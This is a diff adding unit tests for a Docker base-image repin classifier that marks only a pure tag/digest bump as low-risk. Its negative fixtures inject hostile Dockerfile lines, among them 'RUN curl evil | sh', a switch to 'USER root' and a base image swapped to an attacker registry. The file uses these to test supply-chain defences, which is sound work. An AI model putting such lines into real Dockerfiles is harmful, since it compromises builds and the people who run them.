@@ -16,6 +16,8 @@ import {
   repinDockerfile,
   repinBranch,
   readLatestFromGhcr,
+  classifyRepinTier,
+  repinPrBody,
 } from './base-pin-drift.mjs';
 
 const D_OLD = `sha256:${'a'.repeat(64)}`;
@@ -144,4 +146,80 @@ test('readLatestFromGhcr: a 403 becomes a classified error, never a tag', async 
 test('readLatestFromGhcr: no date tags is an error, not a pass', async () => {
   const f = fakeFetch({ [TOKEN_URL]: { body: { token: 't' } }, [TAGS_URL]: { body: { tags: ['latest'] } } });
   assert.match((await readLatestFromGhcr(f)).error, /no YYYY-MM-DD tag/);
+});
+
+// ---- t/305: T0 only for a pure runtime pin bump (TL guardrail p/103#19) ----------------------
+
+test('classifyRepinTier T0: repinDockerfile output (one line, our image, tag/digest only)', () => {
+  const before = dockerfile('2026-11-01', D_OLD);
+  const after = repinDockerfile(before, { tag: '2026-11-08', digest: D_NEW });
+  assert.equal(classifyRepinTier(before, after).tier, 'T0');
+  // Same tag, new digest (the 2026-11-10 re-push) is still a pure pin bump.
+  assert.equal(classifyRepinTier(dockerfile('2026-11-10', D_OLD), dockerfile('2026-11-10', D_NEW)).tier, 'T0');
+  // CRLF files classify the same.
+  assert.equal(classifyRepinTier(dockerfile('2026-11-01', D_OLD, '\r\n'), dockerfile('2026-11-08', D_NEW, '\r\n')).tier, 'T0');
+});
+
+test('classifyRepinTier T1: a second changed line rides along with the pin bump', () => {
+  const before = dockerfile('2026-11-01', D_OLD);
+  const after = dockerfile('2026-11-08', D_NEW).replace('USER aitriad', 'USER root');
+  const r = classifyRepinTier(before, after);
+  assert.equal(r.tier, 'T1');
+  assert.match(r.reason, /2 lines changed/);
+});
+
+test('classifyRepinTier T1: an added or removed line', () => {
+  const before = dockerfile('2026-11-01', D_OLD);
+  assert.equal(classifyRepinTier(before, `${before}\nRUN curl evil | sh`).tier, 'T1');
+  assert.equal(classifyRepinTier(before, before.split('\n').slice(1).join('\n')).tier, 'T1');
+});
+
+test('classifyRepinTier T1: the runtime base swapped to another image', () => {
+  const before = dockerfile('2026-11-01', D_OLD);
+  const after = before.replace('ghcr.io/ai-rosetta-stone/ai-triad-base:2026-11-01', 'ghcr.io/attacker/ai-triad-base:2026-11-08');
+  assert.equal(classifyRepinTier(before, after).tier, 'T1');
+  const lookalike = before.replace('ai-rosetta-stone/ai-triad-base', 'ai-rosetta-stone/ai-triad-base-evil');
+  assert.equal(classifyRepinTier(before, lookalike).tier, 'T1');
+});
+
+test('classifyRepinTier T1: a different single line, the stage name, a non-date tag, or no change', () => {
+  const before = dockerfile('2026-11-01', D_OLD);
+  assert.equal(classifyRepinTier(before, before.replace('RUN echo build', 'RUN echo pwned')).tier, 'T1');
+  assert.equal(classifyRepinTier(before, before.replace(' AS runtime', ' AS builder2')).tier, 'T1');
+  assert.equal(classifyRepinTier(before, before.replace(`2026-11-01@${D_OLD}`, `latest@${D_NEW}`)).tier, 'T1');
+  assert.equal(classifyRepinTier(before, before).tier, 'T1');
+});
+
+test('repinPrBody: tier on line 1; old -> new tag and digest; Base Image run and drift run', () => {
+  const body = repinPrBody({
+    tier: 'T0',
+    tierReason: 'only the runtime ai-triad-base tag/digest changed',
+    reason: 'pin is stale: newer base 2026-11-08 exists',
+    dockerfile: 'taxonomy-editor/Dockerfile',
+    pinned: { tag: '2026-11-01', digest: D_OLD },
+    latest: { tag: '2026-11-08', digest: D_NEW },
+    baseImageRun: 'https://github.com/o/r/actions/runs/111',
+    driftRun: 'https://github.com/o/r/actions/runs/222',
+  });
+  assert.equal(body.split('\n')[0], 'Tier: T0');
+  for (const s of ['2026-11-01', D_OLD, '2026-11-08', D_NEW, 'actions/runs/111', 'actions/runs/222']) assert.ok(body.includes(s), `body lacks ${s}`);
+  const t1 = repinPrBody({ tier: 'T1', tierReason: 'x', reason: 'y', dockerfile: 'd', pinned: { tag: 'a', digest: 'b' }, latest: { tag: 'c', digest: 'e' }, baseImageRun: '', driftRun: 'r' });
+  assert.equal(t1.split('\n')[0], 'Tier: T1');
+  assert.match(t1, /WARN: no successful base-image.yml run/);
+});
+
+test('classifyRepinTier T1: pin bump plus a line appended at the end (line-count site)', () => {
+  const before = dockerfile('2026-11-01', D_OLD);
+  const after = `${dockerfile('2026-11-08', D_NEW)}\nRUN curl evil | sh`;
+  const r = classifyRepinTier(before, after);
+  assert.equal(r.tier, 'T1');
+  assert.match(r.reason, /line count changed/);
+});
+
+test('classifyRepinTier T1: runtime line edited but tag and digest unchanged (whitespace only)', () => {
+  const before = dockerfile('2026-11-01', D_OLD);
+  const after = before.replace(' AS runtime', '  AS runtime');
+  const r = classifyRepinTier(before, after);
+  assert.equal(r.tier, 'T1');
+  assert.match(r.reason, /pin did not change/);
 });
